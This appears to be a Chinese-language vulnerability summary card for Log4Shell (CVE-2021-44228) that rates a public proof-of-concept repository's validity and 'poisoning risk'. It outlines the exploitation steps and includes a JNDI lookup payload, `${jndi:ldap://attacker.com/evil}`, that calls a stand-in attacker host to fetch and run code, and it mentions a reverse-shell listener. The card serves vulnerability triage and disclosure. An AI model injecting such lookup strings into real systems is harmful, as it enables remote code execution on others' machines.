## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)